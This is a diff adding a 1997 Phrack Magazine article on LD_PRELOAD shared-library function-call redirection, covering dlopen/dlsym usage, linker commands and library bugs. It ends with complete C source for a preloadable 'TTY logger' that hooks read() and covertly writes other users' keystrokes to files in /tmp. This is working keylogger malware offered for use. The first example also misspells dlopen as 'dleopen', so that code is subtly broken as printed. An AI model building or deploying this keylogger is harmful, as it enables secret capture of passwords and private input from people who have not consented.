@@ -1,0 +1,211 @@
+---[  Phrack Magazine   Volume 7, Issue 51 September 01, 1997, article 08 of 17
+
+
+-------------------------[  Shared Library Redirection Techniques
+
+
+--------[  halflife <halflife@infonexus.com>
+
+
+This article discusses shared libraries - in particular, a method for doing 
+shared library based function call redirection for multiple purposes.  During 
+the process of writing some code, some bugs were discovered in a few shared 
+library implementations, these are discussed as well.
+
+First off, a short description of shared libraries is in order.  Shared 
+libraries are designed to let you share code segments among programs.  In this 
+way, memory usage is reduced significantly.  Since code segments generally are 
+not modified, this sharing scheme works rather well.  Obviously for this to 
+work, the code segments have to be location independent or PC indepenant (ip 
+independant for the x86 programmers in the audience).
+
+   Now, since the telnetd environment variable hole, most of you know there 
+are several environment variables that can be used to specify alternate shared 
+libraries.  Among them, on most systems, are LD_LIBRARY_PATH and LD_PRELOAD; 
+this article strictly deals with the latter.  Additionally, on Digital UNIX 
+and Irix, this variable is called _RLD_LIST and has a slightly different 
+syntax.
+
+Sun's shared libraries came with an API to let users load and call shared 
+library functions; most other vendors have cloned the interface.  Oddly enough,
+our code will not work in SunOS, although it will in Solaris2.  Anyhow, the 
+first function to be concerned with is called dlopen().  This function 
+basically loads the shared library and mmap()s it into memory if it is not 
+already loaded.  The first argument it accepts, is a pointer to the filename 
+to be loaded, the second argument should usually be 1 (although some platforms 
+seem to support other options).  The manpage provides more details.  A handle 
+is returned on success, you can call dlerror() to determine if a failure 
+occurred.
+
+Once you have dlopen()ed a library, the next goal is to get the address of one 
+or more of the symbols that are inside the library.  You do this with the 
+dlsym() function.  Unfortunately, this is where things can get nonportable.
+On the freely available 4.4BSD machines I tested, dlsym() wants the function 
+name prepended by a underscore character.  This makes perfect sense to me, 
+since that is how C stores function names internally.  The System Vish 
+implementations, which make up the majority of the tested systems, do not use 
+such a convention.  This, unfortunately, means you must use conditional 
+compilation in order to ensure portability.
+
+A simple example of opening a library, getting a function and calling it is 
+shown below:
+
+<++> sh_lib_redir_example.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <dlfcn.h>
+
+main()
+{
+	void *handle;
+	void (*helloworld)(void);
+	char *c;
+
+	handle = dleopen("/tmp/helloworld.so", 1);
+	c = dlerror();
+	if(c)
+	{
+		fprintf(stderr, "couldnt open /tmp/helloworld.so\n");
+		abort();
+	}
+#if __FreeBSD__
+	helloworld = dlsym(handle, "_helloworld");
+#else
+	helloworld = dlsym(handle, "helloworld");
+#endif
+	c = dlerror();
+	if(c)
+	{
+		fprintf(stderr, "couldnt get helloworld symbol\n");
+		abort();
+	}
+	helloworld();
+	dlclose(handle);
+}
+<-->
+
+Okay, now that we understand how to use the programming interface, how do we 
+do function call redirection?  Well, my idea is simple; you preload a library, 
+the preloaded library does its thing, then it dlopen()s the real library and 
+gets the symbol and calls it.  This seems to work well on Solaris, Linux (ELF),
+Irix (5.3 and 6.2), FreeBSD (see bugs section below), and OSF/1 (not tested).
+
+Compiling shared libraries is a little different on each platform.  The 
+compilation stage is basically the same, it is the linking that is actually 
+different.  For GCC, you make the object with something like:
+
+    gcc -fPIC -c file.c
+
+That will create file.o, object code which is suitable for dynamic linking.
+Then you actually have to link it, which is where the fun begins :).  Here is 
+a chart for linking in the various operating systems I have tested this stuff
+on.
+
+FreeBSD:        ld -Bshareable -o file.so file.o
+Solaris:        ld -G -o file.so file.o -ldl
+Linux:          ld -Bshareable -o file.so file.o -ldl
+IRIX:           ld -shared -o file.so file.o
+OSF/1:          ld -shared -o file.so file.o
+
+On IRIX, there is an additional switch you need to use if you are running 6.2,
+it enables backwards ld compatibility; the manpage for ld is your guide.
+
+Unfortunately, all is not happy in the world of shared libs since there are 
+bugs present in some implementations.  FreeBSD in particular has a bug in that 
+if you dlsym() something and it is not found, it will not set the error so 
+dlerror() will return NULL.  OpenBSD is far far worse (*sigh*).  It 
+initializes the error to a value, and does not clear the error when you call 
+dlerror() so at all times, dlerror() will return non NULL. Of course, OpenBSD 
+is incompatible with our methods in other ways too, so it does not really 
+matter I guess :).  The FreeBSD bug is hacked around by testing return values
+for NULL.
+
+Here is a simple TTY logger shared library example.  When you preload it, it 
+will log the keystrokes when users run any nonprivledged shared lib using 
+program.  It stores the logs in /tmp/UID_OF_USER.  Pretty simple stuff.
+
+<++> tty_logger.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/uio.h>
+#include <sys/stat.h>
+#include <string.h>
+#include <fcntl.h>
+#include <dlfcn.h>
+
+/* change this to point to your libc shared lib path */
+#define LIB_PATH "/usr/lib/libc.so.3.0"
+#define LOGDIR "/tmp"
+int logfile = -1;
+
+static void createlog(void)
+{
+	char buff[4096];
+	if(logfile != -1)
+		return;
+	memset(buff, 0, 4096);
+	if(strlen(LOGDIR) > 4000)
+		return;
+	sprintf(buff, "%s/%d", LOGDIR, getuid());
+	logfile = open(buff, O_WRONLY|O_CREAT|O_APPEND, S_IRUSR|S_IWUSR);
+	return;
+}
+
+static void writeout(char c)
+{
+	switch(c)
+	{
+		case '\n':
+		case '\r':
+			c = '\n';
+			write(logfile, &c, 1);
+			break;
+		case 27:
+			break;
+		default:
+			write(logfile, &c, 1);
+	}
+}
+
+ssize_t read(int fd, void *buf, size_t nbytes)
+{
+	void *handle;
+	ssize_t (*realfunc)(int, void *, size_t);
+	int result;
+	int i;
+	char *c;
+	char d;
+
+	handle = dlopen(LIB_PATH, 1);
+	if(!handle)
+		return -1;
+#if __linux__ || (__svr4__ && __sun__) || sgi || __osf__
+	realfunc = dlsym(handle, "read");
+#else
+	realfunc = dlsym(handle, "_read");
+#endif
+	if(!realfunc)
+		return -1;
+	if(logfile < 0)
+		createlog();
+	result = realfunc(fd, buf, nbytes);
+	c = buf;
+	if(isatty(fd))
+	{
+		if(result > 0)
+			for(i=0;i < result;i++)
+			{
+				d = c[i];
+				writeout(d);
+			}
+	}
+	return result;
+}
+<-->
+
+
+----[  EOF
+
